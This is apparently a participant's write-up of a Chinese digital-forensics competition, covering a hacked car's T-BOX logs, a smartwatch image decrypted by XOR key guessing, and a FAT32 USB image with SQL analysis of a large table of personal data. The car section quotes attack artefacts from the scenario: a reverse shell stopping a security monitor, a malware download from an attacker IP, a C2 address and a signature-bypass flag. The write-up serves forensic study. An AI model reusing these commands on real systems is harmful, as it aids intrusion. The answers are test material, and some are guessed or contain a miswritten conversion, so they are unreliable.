+VMAX_LIMIT:OFF
+字样.
+08 固件中存储了用于安全通讯的 Master Key Seed. 请通过分析网关固件, 提取该 16 位十六进制种子值.
+¶
+答案
+A9B8C7D6E5F40123
+同上题. 网关的固件也无法正常逆向, 通过 Strings 获取字符串:
+09 通过分析 BCM 模块导出数据中的 Crash Dump 碎片, 还原碰撞发生瞬间, 车辆大灯处于什么照明模式?
+¶
+答案
+HIGH_BEAM
+通过 Strings 获取字符串:
+10 取证人员在车机浏览器数据库中发现黑客曾访问一个特定的 GitHub 代码仓库地址. 请提交该仓库的名称部分.
+¶
+答案
+staros_root_poc
+浏览器的数据位于
+/data/data/com.starway.browser/
+目录, 其中的
+databases/history.db
+文件为浏览器的历史数据库:
+可以看到访问了
+https://github.com/0xDEADBEEF/staros_root_poc
+(GitHub - staros_root_poc) 和
+http://darkweb-car-hack-forum.onion/exploit/starway_s7_pro
+(Starway S7 Pro Remote Code Execution Exploit). 但实际上, 这 2 个 URL 都是实际不存在的.
+11 T-BOX 系统配置文件已转换, 需解密出被黑客覆写的关键远程代理地址的 IP 地址.
+¶
+答案
+45.33.22.11
+在系统日志
+system/var/log/syslog
+中可以看到
+sshd[1020]: Accepted publickey for root from 45.33.22.11
+.
+在网络接口配置文件
+system/etc/network/interfaces
+中可以看到
+up ip route add 45.33.22.11 via 10.8.0.1
+, 静态路由指向该 IP.
+对 ADAS ECU 固件
+system/lib/firmware/ecu/adas_ecu.bin
+运行 Strings 可以看到
+C2_SERVER=45.33.22.11:8443
+.
+在 T-Box 的流量包
+tbox/comm/telemetry_20251215.pcap
+中可以看到 HTTP GET 请求和 Reverse Shell 均请求该 IP.
+12 查看系统升级日志. 黑客在强制刷入恶意固件时, 使用了哪个完整的"强制忽略签名"参数标志?
+¶
+答案
+-f force
+在
+tbox/ota/update.log
+中可以看到
+[2025-12-14 22:30:18] WARNING: Signature bypass flag is active (-f force).
+.
+13 分析蓝牙连接历史, 找出在碰撞前几分钟连接成功的可疑设备名称.
+¶
+答案
+Diagnostic_Dongle_BLE
+在
+data/data/com.starway.bluetooth/databases/bluetooth.db
+可以看到连接的蓝牙设备信息:
+对时间戳进行转换之后发现, 后者的时间
+2023-12-15 23:40:00
+更接近碰撞发生的时间.
+14 系统的后门程序伪装成系统组件以此维持权限. 请填入该 ELF 攻击脚本在 T-BOX 上的完整绝对路径.
+¶
+本题存疑
+/data/local/tmp/syslogd_update
+或
+/data/local/tmp/k_hook.ko
+在系统内核日志
+system/var/log/kern.log
+中可以看到
+staros_sec: WARNING - Load module /data/local/tmp/k_hook.ko without correct signature!
+, 加载了未正确签名的模块
+/data/local/tmp/k_hook.ko
+.
+但实际上在
+/data/local/tmp
+只存在
+syslogd_update
+文件, 根据文件签名看是个 ELF 文件, 但实际上并非正常的 ELF 文件:
+15 从 EDR 采样记录中提取出车辆在碰撞瞬间(采样点 0)记录的纵向车速数值(单位: km/h).
+¶
+答案
+180
+在
+edr
+目录下有几个
+bin
+文件. 正常来说读取 EDR 数据需要用到 Bosch CDR 软件, 但这玩意儿的售价高达 60000 刀/年, 直接放弃.
+在行车记录仪的文件
+/dashcam/metadata.json
+中看到相关信息:
+JSON
+{
+"device"
+:
+"Starway_Dashcam_V1"
+,
+"firmware"
+:
+"v1.2.3"
+,
+"events"
+:
+[
+{
+"file"
+:
+"EVT_20251215_234500_CRASH.mp4"
+,
+"trigger"
+:
+"G_SENSOR_X_SHOCK"
+,
+"g_forces"
+:
+{
+"x"
+:
+-8.5
+,
+"y"
+:
+1.2
+,
+"z"
+:
+0.5
+},
+"coordinates"
+:
+{
+"lat"
+:
+30.7512
+,
+"lon"
+:
+120.8015
+},
+"speed_kmh"
+:
+180
+,
+"timestamp_utc"
+:
+"2025-12-15T23:45:01Z"
+,
+"integrity_check"
+:
+"FAILED"
+}
+]
+}
+16 从碰撞前 5 秒采样点中恢复出的纵向车速是多少?
+¶
+答案
+180
+在 OBD 数据
+obd\history\freeze_frame_B0070.bin
+中可以看到以下数据:
+Text Only
+B0 07 03 0C 02 1F 40 0D 01 B4 11 01 FF
+根据 SAE J1979 标准定义的 OBD-II PID,  前 2 字节
+0xB007
+为 OBD 代码, 代表
+Driver Seatbelt Pretensioner "A" Deployment Control (Subfault)
+(驾驶员安全带预紧器展开控制故障)错误, 参考
+obd-codes - b0070
+.
+OBD 代码的第一位代表错误发生的组件, 不同组件的 OBD-II 数据格式略有不同:
+P: 动力系统(发动机和变速器等)
+B: 车身(安全气囊/SAS, 安全带, 空调, 舒适性和内部电子设备等)
+C: 底盘(ABS, 牵引, 转向, 悬挂和轮速传感器等)
+U: 网络(模块通信, CAN 和电力网络等)
+接下来的
+0x03
+是故障码状态位(DTC status bit), 意为"当前存在故障, 故障待处理". 参考
+故障码状态位_DTC status bit
+.
+接下来的
+0x0C
+为 OBD-II 的 PID, 提示接下来的数据为
+Engine speed
+(引擎转速). 参考
+OBD-II_PIDs - Standard PIDs
+. 随后的
+0x02
+代表数据有 2 字节长. 再随后的
+0x1F40
+为数据, 根据 OBD-II 的定义, 计算公式为
+\(\frac{256 \cdot A + B}{4}\)
+, 其中
+\(A\)
+为数据的低字节,
+\(B\)
+为数据的高字节, 因此计算得到转速为
+\(\frac{256 \cdot 31 + 64}{4} = 2000\)
+RPM.
+接下来的
+0x0D
+为 OBD-II 的 PID, 提示接下来的数据为
+Vehicle speed
+(车速). 随后的
+0x01
+代表数据有 1 字节长. 再随后的
+0xB4
+为数据, 根据 OBD-II 的定义, 该数值
+0xB4 = 180
+km/h 即为车速.
+接下来的
+0x11
+为 OBD-II 的 PID, 提示接下来的数据为
+Throttle position
+(节流阀位置). 随后的
+0x01
+代表数据有 1 字节长. 再随后的
+0xFF
+为数据, 根据 OBD-II 的定义, 计算公式为
+\(\frac{100}{255} \cdot A\)
+, 因此计算得到节气门位置为
+\(\frac{100}{255} \cdot 255 = 100\)
+%.
+在 OBD 数据
+obd\history\freeze_frame_P0420.bin
+中可以看到以下数据:
+Text Only
+50 30 34 32 02 0C 02 08 00 0D 01 32  P042.......2
+前 4 字节
+0x50303432
+为
+P042
+的十六进制, 为 OBD 代码, 代表
+Catalyst System Efficiency Below Threshold
+(催化剂系统效率低于阈值), 参考
+obd-codes - p0420
+.
+接下来的
+0x02
+是故障码状态位, 意为"当前存在故障".
+接下来的
+0x0C
+为 OBD-II 的 PID, 提示接下来的数据为
+Engine speed
+(引擎转速). 随后的
+0x02
+代表数据有 2 字节长. 再随后的
+0x0800
+为数据, 计算得到转速为
+\(\frac{256 \cdot 8 + 0}{4} = 512\)
+RPM.
+接下来的
+0x0D
+为 OBD-II 的 PID, 提示接下来的数据为
+Vehicle speed
+(车速). 随后的
+0x01
+代表数据有 1 字节长. 再随后的
+0x32
+为数据, 该数值
+0xB4 = 50
+km/h 为车速.
+综上所述:
+冻结帧
+freeze_frame_B0070.bin
+产生时, 汽车遭遇了来自车身的故障"驾驶员安全带预紧器展开控制故障", 引擎转速为 2000 RPM, 车速为 180 km/h, 节流阀全开.
+冻结帧
+freeze_frame_P0420.bin
+产生时, 汽车遭遇了来自动力系统的故障"催化剂系统效率低于阈值", 引擎转速为 512 RPM, 车速为 50 km/h.
+17 分析 OBD 诊断历史，提取出碰撞瞬时车辆自动记录的冻结帧(Freeze Frame)中的引擎 RPM 数值。
+¶
+答案
+2000
+见上题分析. 根据引擎转速, 车速和节流阀开启程度判断冻结帧
+freeze_frame_B0070.bin
+为碰撞前或碰撞时产生的 OBD 数据.
+18 分析 PKE 系统的 RF 日志, 找出那把非法克隆生成的 NFC 卡片钥匙所对应的 ID, 该 ID 在事发当晚被用于非法侵入.
+¶
+答案
+0x9F8E
+RF(射频) 日志为
+/security/pke/rf_logs.txt
+, 文件内容如下:
+Text Only
+2025-12-15 08:30:12 | KEY_ID: 0x1A2B | ACTION: UNLOCK | METHOD: LF/RF (PKE) | RSSI: -40dBm
+2025-12-15 08:31:00 | KEY_ID: 0x1A2B | ACTION: ENGINE_START | AUTH: OK
+2025-12-15 18:45:22 | KEY_ID: 0x1A2B | ACTION: ENGINE_STOP | STATE: OFF
+2025-12-15 18:46:01 | KEY_ID: 0x1A2B | ACTION: LOCK | METHOD: RKE (Button) | RSSI: -65dBm
+2025-12-15 23:25:10 | KEY_ID: 0xUNKNOWN | ACTION: AUTH_CHALLENGE | RSSI: -90dBm
+2025-12-15 23:25:21 | KEY_ID: 0xUNKNOWN | ACTION: AUTH_FAIL | ERROR: INVALID_RESPONSE
+2025-12-15 23:31:05 | KEY_ID: 0x9F8E | ACTION: UNLOCK | METHOD: NFC_CARD | STATE: SUCCESS
+2025-12-15 23:32:00 | KEY_ID: 0x9F8E | ACTION: ENGINE_START | METHOD: DIAG_BYPASS
+其中最后 2 条日志进行了用 ID 为
+0x9F8E
+的 NFC 卡解锁了汽车, 随后通过
+DIAG_BYPASS
+(诊断接口) 启动了汽车引擎.
+19 在行车记录仪元数据中记录了碰撞瞬间的加速度. 请指出该元数据完整性校验的状态.
+¶
+答案
+FAILED
+见第 15 题,
+metadata.json
+文件中
+"integrity_check": "FAILED"
+, 意为完整性校验失败.
+20 综合分析所有证据, 黑客最终通过哪种方式实现了对车辆 ADAS 固件的非法篡改?
+¶
+答案
+诊断服务
+在 T-Box 记录的 OTA 更新日志
+/tbox/ota/update.log
+中可以看到:
+Text Only
+[2025-11-20 02:00:00] OTA Check: No updates available.
+[2025-12-01 03:00:00] OTA Check: Found V3.2.1-patch1.
+[2025-12-01 03:05:00] Download successful. Verifying signature...
+[2025-12-01 03:05:10] Signature VALID. Applying update...
+[2025-12-01 03:15:00] Update SUCCESS. Rebooting.
+[2025-12-14 22:30:15] DEBUG_MODE: Local firmware push detected.
+[2025-12-14 22:30:18] WARNING: Signature bypass flag is active (-f force).
+[2025-12-14 22:35:00] Flashed partition 'adas' via diagnostic service.
+[2025-12-14 22:36:00] System state altered locally.
+[2025-12-15 23:40:00] OTA Check: Target Server timeout.
+系统在
+2025-12-01 03:00:00
+接收到了 OTA 升级
+V3.2.1-patch1
+.
+在
+2025-12-14 22:30:15
+通过调试模式 (
+DEBUG_MODE
+) 推送了固件并应用了忽略签名的标志 (
+Signature bypass flag
+).
+在
+2025-12-14 22:35:00
+通过诊断服务 (
+diagnostic service
+) 完成了
+adas
+分区的固件刷入.
+21 在遥感数据包流量中, 黑客在回传 C2 服务器的数据中实时记录了车速. 请找出 JSON 载荷中
+speed
+键对应的值.
+¶
+答案
+180
+遥感数据流量包为
+1/tbox/comm/telemetry_20251215.pcap
+, 使用 Strings 查看流量包中的字符串:
+其中 JSON 格式的 Payload 是
+{"lat":31.2, "lon":121.4, "speed":180}
+, 车速为 180.
+22 为躲避 IDS 的监控, 恶意流量通过 HTTP GET 请求伪装成媒体流请求. 请找出该恶意回连所请求的伪装域名(Host).
+¶
+答案
+streaming.starway.com
+接上题, 伪装的媒体流请求为
+HTTP_GET: /media/audio/playlist_1.m3u8 Host: streaming.starway.com
+.
+23 黑客建立 Reverse Shell 后, 执行了哪条指令来强行停止车机底层的安全监护进程?
+¶
+答案
+systemctl stop sec_monitor
+接上题, 用于停止安全监护进程的指令为
+root@starOS:~# systemctl stop sec_monitor
+.
+24 黑客通过发送包含固件包地址的 API 请求来下载恶意代码. 提交 JSON 载荷中
+pkg
+键对应的完整 URL.
+¶
+答案
+http://45.33.22.11/malicious.bin
+接上题, 用于下载恶意代码的请求为
+HTTP_GET: /api/v1/ota/force_update?pkg=http://45.33.22.11/malicious.bin
+.
+25 黑客为了提权并获取 Root 用户身份, 在 Shell 中执行的初始探测指令是什么?
+¶
+答案
+id
+接上题. 用于获取当前用户信息的指令为
+root@starOS:~# id
+.
+26 反向 Shell 成功建立后, 返回的权限对应的 UID 数值是多少?
+¶
+答案
+0
+接上题, id 指令的回显为
+uid=0(root) gid=0(root) groups=0(root)
+.
+27 黑客在其利用漏洞上传的 ELF 脚本中, 使用了哪个特定的进程名称来伪装成系统日志服务?
+¶
+答案
+syslogd_update
+data/local/tmp/syslogd_update
+文件名伪装为系统日志服务(syslogd)的更新.
+林小婉智能手表
+¶
+Info
+以下题目分析林小碗手表检材.
+这个检材也是无法进行正常读取, 镜像不是正常的手表数据镜像.
+对于该检材的分析, LyCecilion @ StarCEO 给出了一个比较好的方案: 为了快速识别明文内容/弱加密内容和强加密内容, 对整个镜像文件进行熵值分析.
+以 010 Editor 为例. 打开镜像之后选择 Tools -> Histogram/Entropy, 分析完毕后可在 Histogram 视图看到文件的熵信息:
+可以看到, 整个文件中除了
+0x00
+之外, 其余的
+0x01
+~
+0xff
+字节的比例均为
+0.148%
+, 极其接近平均分布, 因此推测文件中存在的绝大多数数据为随机数据或强加密数据. 从熵图可以看到仅有 7 处文件片段可能是有意义的:
+第 1 处位于文件开头, 可见明文字符串:
+Text Only
+HWOS
+729F1401
+HUAWEI WATCH GT 5
+对第 2 处进行粒度更细的熵分析, 找到 1 处明文
+RECV
+:
+对第 3 处进行粒度更细的熵分析, 找到 4 处明文信息:
+Text Only
+# Base POS 12FF61000
+# POS Offset 0x1ADA00
+SYSH
+4.0.0.128(C00E128R2P8)
+# POS Offset 0x1BDA00
+ro.product.model=HUAWEI WATCH GT 5
+ro.product.brand=Huawei
+ro.hardware=kirin
+persist.sys.timezone=Asia/Shanghai
+# POS Offset 0x1CDA00
+com.huawei.health:华为运动健康:12.0.0.300
+com.huawei.wearables:华为穿戴:12.0.0.300
+com.huawei.heartrate:心率:4.0.0.100
+com.huawei.sleep:睡眠:4.0.0.100
+com.huawei.gps:GPS:4.0.0.100
+# POS Offset 0x1DDA00
+SIG
+对第 4 处进行粒度更细的熵分析, 找到 2 个数据块, 保存到文件并分别命名为
+FileSection_1.bin
+和
+FileSection_2.bin
+:
+对第 5 处进行粒度更细的熵分析, 找到与第 3 处相同的明文.
+对第 6 处进行粒度更细的熵分析, 找到 2 处明文信息:
+Text Only
+# Base POS 0x107E0DE00
+# POS Offset 0x1F3200
+libhealth_service.so
+# POS Offset 0x29337B
+libheart_rate.so
+对第 7 处进行粒度更细的熵分析, 找到:
+Text Only
+KEY_SEGMENTS: 0x30, 0x1005, 0x2008, CHECKSUM: CRC32
+下来就是脑洞环节了. 首先根据疑似加密的内容(上述分析中导出的 2 个数据块)具低墒特征, 可以推断其为某种弱加密, 可能是古典加密方法或着非级联的分组/分块加密, 加密数据依然保留着原始数据的分布特征. 对于此类加密并且加密结果存在不可见字符, 第一反应就是经过了异或.
+但是在缺少明文片段的情况下, 解异或就需要密钥或者爆破. 用以下方法可以得到异或密钥为
+729F140123
+. 用该密钥可以解密上述导出的 2 个数据块. 解密结果如下:
+JSON
+{
+"owner"
+:
+{
+"name"
+:
+"林小婉"
+,
+"age"
+:
+32
+,
+"gender"
+:
+"female"
+,
+"height_cm"
+:
+163
+,
+"weight_kg"
+:
+52
+},
+"device"
+:
+{
+"serial"
+:
+"SGEBX2241A"
+,
+"mac"
+:
+"D8:3A:DD:72:9F:14"
+,
+"model"
+:
+"HUAWEI WATCH GT 5"
+},
+"settings"
+:
+{
+"heart_rate_monitor"
+:
+true
+,
+"step_goal"
+:
+8000
+,
+"sleep_tracking"
+:
+true
+},
+"fitness"
+:
+{
+"step_goal"
+:
+8000
+,
+"calorie_goal"
+:
+500
+}
+}
+JSON
+{
+"running"
+:
+{
+"name"
+:
+"户外跑步"
+,
+"cal_factor"
+:
+1.0
+},
+"swimming"
+:
+{
+"name"
+:
+"游泳"
+,
+"cal_factor"
+:
+8.0
+}}
+以上也就是我从镜像中获取到全部信息了, 只能完成本部分的前 2 题, 其余题目均无法完成.
+方案一: 脑洞 + 爆破
+¶
+如果脑洞够大, 猜到镜像文件开头的
+729F1401
+是异或的密钥, 尝试进行解密的话, 就会发现部分数据成功解密了:
+计算几处成功解密的数据片段之间间隔的字节数:
+{\x0A  "own
+与
+"setting
+之间: 240 字节.
+"setting
+与
+tracking
+之间: 80 字节.
+由此可以推断真实 Key 的长度为 10, 16, 20, 40 或 80.
+推导过程
+设: 真实 XOR key 长度为
+\(K\)
+, 当前猜测 key 长度为
+\(k=8\)
+则成功解密片段重复出现的周期应满足:
+\[
+P=\mathrm{lcd}(K,k)=\mathrm{lcd}(K,4)
+\]
+观察到成功片段间距为 240 和 80, 因此:
+\[
+P | \gcd(240, 80) \Rightarrow P | 80
+\]
+即:
+\[
+\mathrm{lcd}(K,4) ∣ 80
+\]
+由于:
+\[
+80=2^4\times5
+\]
+可得可能的周期:
+\[
+P\in \{4,8,16,20,40,80\}
+\]
+进一步得到可能的真实密钥长度:
+\[
+K\in\{4,5,8,10,16,20,40,80\}
+\]
+且
+\[
+K \gt k
+\]
+所以
+\[
+K\in\{10,16,20,40,80\}
+\]
+接着, 先确定真实密钥的长度. 尝试给
+729F1401
+后任意添加 2 字节的数据, 进行异或:
+发现除了任意添加的 2 位对应的数据之外, 均正常解密, 因此真实密钥的长度为 10 字节. 有于已知的明文为 JSON 格式, 使用真实的密钥解密后的结果应该大部分为可打印字符. 通过 Python 脚本找到可能性较高的字节:
+Python
+PRINTABLE
+=
+set
+(
+printable
+.
+encode
+())
+data
+=
+open
+(
+"./FileSection_1.bin"
+,
+"rb"
+)
+.
+read
+()
+scores_8
+=
+Counter
+()
+scores_9
+=
+Counter
+()
+for
+i
+,
+c
+in
+enumerate
+(
+data
+):
+pos
+=
+i
+%
+KEY_LEN
+if
+pos
+==
+8
+:
+for
+k
+in
+range
+(
+256
+):
+p
+=
+c
+^
+k
+if
+p
+in
+PRINTABLE
+:
+scores_8
+[
+k
+]
++=
+1
+elif
+pos
+==
+9
+:
+for
+k
+in
+range
+(
+256
+):
+p
+=
+c
+^
+k
+if
+p
+in
+PRINTABLE
+:
+scores_9
+[
+k
+]
++=
+1
+for
+k
+,
+n
+in
+scores_8
+.
+most_common
+(
+10
+):
+ch
+=
+chr
+(
+k
+)
+if
+32
+<=
+k
+<
+127
+else
+'.'
+print
+(
+f
+"
+{
+ch
+}
+"
+,
+end
+=
+" "
+)
+print
+(
+""
+)
+for
+k
+,
+n
+in
+scores_9
+.
+most_common
+(
+10
+):
+ch
+=
+chr
+(
+k
+)
+if
+32
+<=
+k
+<
+127
+else
+'.'
+print
+(
+f
+"
+{
+ch
+}
+"
+,
+end
+=
+" "
+)
+输出结果为:
+Text Only
+1 2 3 4 5 z { | } j
+0 2 3 4 5 a f g e !
+进行尝试, 发现正确的密钥为
+729F140123
+:
+方案二: 基于自然语言推断的爆破
+¶
+用这个方法也需要猜. 根据题目来看文件可能是配置文件或者应用数据, 如果是前者, 那么配置文件中必然出现一些自然语言(英文单词), 因此可以试着以此为依据爆破. 由于不知道密钥长度, 需要从长度为 1 开始测试. 使用的工具是来自
+Cracking simple XOR cipher with simulated annealing
+的 Python 脚本, 进行了修改(使用大模型调整了奖励分数, 添加了常见于配置文件中的符号组合).
+破解得到密钥:
+01 手表型号是?
+¶
+答案
+HUAWEI WATCH GT 5
+见上述分析过程.
+02 发现林小碗实际年龄是多少岁?
+¶
+答案
+32
+见上述分析过程.
+03 发现林小碗经常外出跑步, 主要运动区域是?
+¶
+本题存疑
+本题存疑
+04 发现林小碗经常外出跑步, 平均跑步几公里?
+¶
+本题存疑
+本题存疑
+05 分析林小碗高压力 (>70) 天数是多少天?
+¶
+本题存疑
+本题存疑
+06 分析林小碗平均心率是多少?
+¶
+本题存疑
+本题存疑
+07 分析林小碗 2024 年 12 月 25 日在哪里运动?
+¶
+本题存疑
+本题存疑
+方俊朗 U 盘
+¶
+Info
+以下题目分析方俊朗
+UDisk.img
+检材.
+01 第 1 个扇区前 3 字节的十六进制值是什么?
+¶
+答案
+EB 3C 90
+查看镜像发现文件开头存在
+MSDOS
+字样, 为 RAW 镜像, 因此文件的前 3 字节即为第 1 个扇区的前 3 字节:
+02 每簇占多少个扇区?
+¶
+答案
+16
+通过 010 Editor 的模板识别, 发现整个 BootSector 和驱动器都报了错, 查看之后发现, 在镜像文件的
+0xC00
+位置还有另一个 BootSector:
+删除
+0xC00
+之前的数据, 重新运行 010 Editor 的 Drive 模板:
+之后可以看到
+SectorsPerCluster
+的值为
+0x10
+, 即每个簇包含 16 个扇区.
+03 FAT12/16 兼容字段"根目录项数"是多少?
+¶
+答案
+512
+MaxRootDirEntries
+的值为
+0x200
+, 即最大根目录项数量为 512.
+04 隐藏扇区数是多少?
+¶
+答案
+63
+NumHiddenSectors
+的值为
+0x3F
+, 即隐藏扇区数量为 63 个.
+05 BPB 中声明的总扇区数是多少?
+¶
+答案
+50000000
+NumberOfSectors32
+的值为
+0x2FAF080
+, 即扇区总数为 50000000.
+06 每张 FAT 表占多少个扇区?
+¶
+答案
+30000
+见上题图,
+SectorsPerFat32
+的值为
+0x7530
+, 即每张 FAT 表占用 30000 个扇区.
+07 真实的根目录起始簇应为多少?
+¶
+答案
+2
+在删除虚假的 BootSector 之后, 还需要修正
+ReservedSectors
+, 真实 BootSector 中
+ReservedSectors
+=
+0xCCA
+, 删除 6 个虚假扇区后应改为
+0xCCA
+−
+0x6
+=
+0xCC4
+.
+接着即可用 FTK Imager 加载镜像, 查看
+[root]
+目录的信息, 可以看到
+Start Cluster
+为 2:
+或者在 010 Editor 中查看:
+火眼可以自动对镜像进行修复, 挂载后, 可以正常读取镜像内的文件.
+08 FSInfo 扇区号是多少?
+¶
+答案
+1
+见上题图,
+InfoSector
+为 1.
+09 备份扇区实际引导扇区号是?
+¶
+答案
+6
+见第 07 题图,
+BootBackupStart
+为 6.
+10 卷序列号的十六进制值是多少?
+¶
+答案
+0C0F6F08
+在 010 Editor 中查看,
+SerialNumber
+的值为
+0xC0F6F08
+:
+或者在 FTK Imager 中查看:
+11 分析视频, 进入暗门的密码是多少?
+¶
+答案
+740
+视频直接给了个电影(英雄本色), 没绷住. 比赛前跟队友开玩笑说我要一边在副屏看电影一边打比赛, 这下好了, 真有的看了.
+进入暗门的片段在电影开头部分:
+遮挡比较严重, 大概能看出来按了
+740
+:
+12 分析视频, 主角第一次带货去的国家是?
+¶
+答案
+印尼
+网上下个字幕, 搜一下:
+13 分析视频, 阿成乘坐的奔驰车牌号是多少?
+¶
+答案
+DF 8828
+实在没招了, 用 AI 查了:
+在引用网站中有 1 个网站, 可以看到电影的截图, 其中有车牌号
+DF 8828
+:
+14 分析视频, 男主角弟弟上司总共戴过几款领带?
+¶
+答案
+3
+这个角色甚至不是主要配角, 网上都查不到人物介绍.
+没招了, 蒙的, 蒙对了. 也有人说是 4 款. 出这种题不就是让大伙碰运气的吗.
+15 分析表格, 出现电话号码最多的后四位是?
+¶
+答案
+2133
+表格文件
+_00W.csv
+位于根目录, 被标记删除, 文件内容实际上没有删除.
+文件是个超过 500 MB 大小的 CSV 文件, 考虑将文件内容导入到数据库中进行分析. 使用 Navicat 连接本地 MySQL 数据库, 将 CSV 文件导入为
+_00W
+表, 共计导入 2000000 条数据.
+执行查询语句:
+SQL
+SELECT
+SUBSTRING
+(
+`
+电话
+`
+,
+-
+4
+)
+AS
+last4
+,
+COUNT
+(
+*
+)
+AS
+cnt
+FROM
+`
+_00w
+`
+GROUP
+BY
+last4
+ORDER
+BY
+cnt
+DESC
+LIMIT
+10
+;
+运行结果:
+16 分析表格, 平均资产最高的 BIN 码?
+¶
+答案
+622446
+执行查询语句:
+SQL
+SELECT
+LEFT
+(
+`
+银行卡号
+`
+,
+6
+)
+AS
+bin_code
+,
+AVG
+(
+`
+资产（人民币）
+`
+)
+AS
+avg_asset
+FROM
+`
+_00w
+`
+GROUP
+BY
+bin_code
+ORDER
+BY
+avg_asset
+DESC
+LIMIT
+10
+;
+运行结果:
+BIN 码
+BIN (Bank Identification Number, 银行识别号)指的是银行卡上的前 6 位数字(通常情况 6 位, 但也有 4-5 位或 7-8 位的情况), 用于标识发卡的金融机构. 中国银联的 BIN 码范围为 622126 ~ 622925.
+17 分析表格, 邮箱字段中出现几种不同的域名?
+¶
+答案
+3
+执行查询语句:
+SQL
+SELECT
+COUNT
+(
+DISTINCT
+SUBSTRING_INDEX
+(
+`
+邮箱
+`
+,
+'@'
+,
+-
+1
+))
+AS
+domain_count
+FROM
+`
+_00w
+`
+;
+运行结果:
+18 分析表格, 男性比女性多出多少人?
+¶
+答案
+354
+执行查询语句:
+SQL
+SELECT
+性别
+,
+COUNT
+(
+*
+)
+AS
+cnt
+FROM
+`
+_00w
+`
+GROUP
+BY
+性别
+;
+运行结果:
+19 接上题, 按"最后登录时间"的月份(2024-01 ~ 2024-12)计算每月近 90 天活跃率, 并给出其变异系数 CV = 标准差 / 均值.
+¶
+答案
+0.3341
+题目描述看不太懂, 我猜是"按最后登录时间的月份为用户分组, 计算每组用户最后登录时间的前 90 天内的活跃率, 并给出其变异系数 CV = 标准差 / 均值"的意思.
+执行 AI 写的查询语句:
+SQL
+SET
+@
+total
+:
+=
+(
+SELECT
+COUNT
+(
+*
+)
+FROM
+`
+_00w
+`
+);
+SELECT
+m
+.
+month_label
+AS
+`
+月份
+`
+,
+SUM
+(
+CASE
+WHEN
+o
+.
+`
+最后登录时间
+`
+>=
+m
+.
+cutoff
+AND
+o
+.
+`
+最后登录时间
+`
+<=
+LAST_DAY
+(
+STR_TO_DATE
+(
+CONCAT
+(
+m
+.
+month_label
+,
+'-01'
+),
+'%Y-%m-%d'
+))
+THEN
+1
+ELSE
+0
+END
+)
+AS
+`
+活跃人数
+`
+,
+ROUND
+(
+SUM
+(
+CASE
+WHEN
+o
+.
+`
+最后登录时间
+`
+>=
+m
+.
+cutoff
+AND
+o
+.
+`
+最后登录时间
+`
+<=
+LAST_DAY
+(
+STR_TO_DATE
+(
+CONCAT
+(
+m
+.
+month_label
+,
+'-01'
+),
+'%Y-%m-%d'
+))
+THEN
+1
+ELSE
+0
+END
+)
+/
+@
+total
+*
+100
+,
+2
+)
+AS
+`
+活跃率
+(
+%
+)
+`
+FROM
+(
+SELECT
+'2024-01'
+AS
+month_label
+,
+'2023-10-03'
+AS
+cutoff
+UNION
+ALL
+SELECT
+'2024-02'
+,
+'2023-11-02'
+UNION
+ALL
+SELECT
+'2024-03'
+,
+'2023-12-02'
+UNION
+ALL
+SELECT
+'2024-04'
+,
+'2024-01-01'
+UNION
+ALL
+SELECT
+'2024-05'
+,
+'2024-02-01'
+UNION
+ALL
+SELECT
+'2024-06'
+,
+'2024-03-02'
+UNION
+ALL
+SELECT
+'2024-07'
+,
+'2024-04-01'
+UNION
+ALL
+SELECT
+'2024-08'
+,
+'2024-05-02'
+UNION
+ALL
+SELECT
+'2024-09'
+,
+'2024-06-01'
+UNION
+ALL
+SELECT
+'2024-10'
+,
+'2024-07-02'
+UNION
+ALL
+SELECT
+'2024-11'
+,
+'2024-08-01'
+UNION
+ALL
+SELECT
+'2024-12'
+,
+'2024-09-02'
+)
+m
+CROSS
+JOIN
+`
+_00w
+`
+o
+GROUP
+BY
+m
+.
+month_label
+,
+m
+.
+cutoff
+ORDER
+BY
+m
+.
+month_label
+;
+SELECT
+ROUND
+(
+AVG
+(
+rate
+),
+4
+)
+AS
+`
+均值
+(
+%
+)
+`
+,
+ROUND
+(
+STDDEV_SAMP
+(
+rate
+),
+4
+)
+AS
+`
+标准差
+`
+,
+ROUND
+(
+STDDEV_SAMP
+(
+rate
+)
+/
+AVG
+(
+rate
+),
+4
+)
+AS
+`
+变异系数
+CV
+`
+FROM
+(
+SELECT
+m
+.
+month_label
+,
+SUM
+(
+CASE
+WHEN
+o
+.
+`
+最后登录时间
+`
+>=
+m
+.
+cutoff
+AND
+o
+.
+`
+最后登录时间
+`
+<=
+LAST_DAY
+(
+STR_TO_DATE
+(
+CONCAT
+(
+m
+.
+month_label
+,
+'-01'
+),
+'%Y-%m-%d'
+))
+THEN
+1
+ELSE
+0
+END
+)
+/
+@
+total
+*
+100
+AS
+rate
+FROM
+(
+SELECT
+'2024-01'
+AS
+month_label
+,
+'2023-10-03'
+AS
+cutoff
+UNION
+ALL
+SELECT
+'2024-02'
+,
+'2023-11-02'
+UNION
+ALL
+SELECT
+'2024-03'
+,
+'2023-12-02'
+UNION
+ALL
+SELECT
+'2024-04'
+,
+'2024-01-01'
+UNION
+ALL
+SELECT
+'2024-05'
+,
+'2024-02-01'
+UNION
+ALL
+SELECT
+'2024-06'
+,
+'2024-03-02'
+UNION
+ALL
+SELECT
+'2024-07'
+,
+'2024-04-01'
+UNION
+ALL
+SELECT
+'2024-08'
+,
+'2024-05-02'
+UNION
+ALL
+SELECT
+'2024-09'
+,
+'2024-06-01'
+UNION
+ALL
+SELECT
+'2024-10'
+,
+'2024-07-02'
+UNION
+ALL
+SELECT
+'2024-11'
+,
+'2024-08-01'
+UNION
+ALL
+SELECT
+'2024-12'
+,
+'2024-09-02'
+)
+m
+CROSS
+JOIN
+`
+_00w
+`
+o
+GROUP
+BY
+m
+.
+month_label
+)
+AS
+t
+;
+运行结果:
+20 接上题, 做反事实模拟: 每位客户信用评分统一 +20 分(上限 900). 统计"由非目标迁入目标"的人数, 目标定义为 信用 >= 700 且 资产 >= 全体中位数.
+¶
+答案
+36636
+执行查询语句, 获取中位数资产:
+SQL
+SELECT
+@
+row_idx
+:
+=
+@
+row_idx
++
+1
+AS
+rn
+,
+`
+资产（人民币）
+`
+FROM
+`
+_00w
+`
+,
+(
+SELECT
+@
+row_idx
+:
+=
+0
+)
+r
+ORDER
+BY
+`
+资产（人民币）
+`
+LIMIT
+1
+OFFSET
+999999
+;
+运行结果:
+执行查询语句, 获取迁入人数:
+SQL
+SELECT
+COUNT
+(
+*
+)
+AS
+migrated_count
+FROM
+`
+_00w
+`
+WHERE
+NOT
+(
+信用评分
+>=
+700
+AND
+`
+资产（人民币）
+`
+>=
+1002541
+.
+17
+)
+AND
+(
+LEAST
+(
+信用评分
++
+20
+,
+900
+)
+>=
+700
+AND
